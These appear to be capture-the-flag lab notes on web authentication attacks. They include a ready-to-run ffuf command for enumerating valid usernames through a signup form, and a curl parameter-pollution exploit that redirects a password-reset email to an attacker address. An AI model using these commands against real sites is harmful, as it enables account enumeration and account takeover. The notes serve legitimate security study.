
# Username Enumeration with ffuf

**Goal:** Identify valid usernames by fuzzing a website's signup/login endpoint and looking for a response that differs when a username already exists.

### Command

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST \
-d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://TARGET/customers/signup \
-mr "username already exists"
```

### Command Breakdown

|Option|Meaning|
|---|---|
|`-w names.txt`|Wordlist containing possible usernames|
|`-X POST`|Send **POST** requests|
|`-d "..."`|POST data sent to the signup form|
|`FUZZ`|Position where ffuf inserts each username|
|`-H`|Sets the HTTP `Content-Type` header|
|`-u`|Target URL|
|`-mr "..."`|**Match Response** — only show responses containing this text|

### How It Works

ffuf replaces `FUZZ` with every username from the wordlist:
```text
username=admin
username=john
username=alice
username=bob
...
```

If the server responds with:
```text
username already exists
```
ffuf reports that username as **potentially valid**.


---

# Parameter Pollution in Password Reset

**Goal:** Exploit duplicate parameters to make the application use **different email values** for account verification and sending the reset link.

### Legitimate Request

```bash
curl 'http://TARGET/customers/reset?email=robert@acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert'
```

### Exploit

```bash
curl 'http://TARGET/customers/reset?email=robert@acmeitsupport.thm' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d 'username=robert&email=attacker@example.com'
```

### Why It Works
- `email` in **query string** → identifies the target account.
- `username` in **POST body** → confirms the username.
- Another `email` in **POST body** → overrides the query-string value when PHP uses `$_REQUEST`.
- Result → reset email is sent to the **attacker-controlled address**.
    
**Remember:**  
`Query parameter + duplicate POST parameter → POST value can override it → Parameter Pollution`